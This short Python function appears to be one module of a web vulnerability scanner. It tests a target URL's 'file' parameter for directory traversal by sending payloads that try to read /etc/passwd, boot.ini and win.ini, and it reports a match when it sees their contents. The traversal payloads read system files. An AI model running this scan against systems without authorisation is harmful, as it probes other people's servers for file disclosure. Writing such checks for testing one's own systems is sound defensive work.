import requests

def scan_directory_traversal(target):
    result = f"Directory Traversal Scan for: {target}\n\n"
    
    payloads = [
        "../../../../../../etc/passwd",
        "../../boot.ini",
        "../../../../../../windows/win.ini",
        "../" * 6 + "etc/passwd"
    ]
    
    vulnerable = False

    for payload in payloads:
        test_url = f"{target}?file={payload}"
        try:
            response = requests.get(test_url, timeout=5)
            if "root:x:" in response.text or "[boot loader]" in response.text:
                result += f"[!] Potential Directory Traversal vulnerability found at: {test_url}\n"
                vulnerable = True
        except requests.RequestException:
            continue

    if not vulnerable:
        result += "[-] No directory traversal vulnerabilities detected (basic check)."

    return result
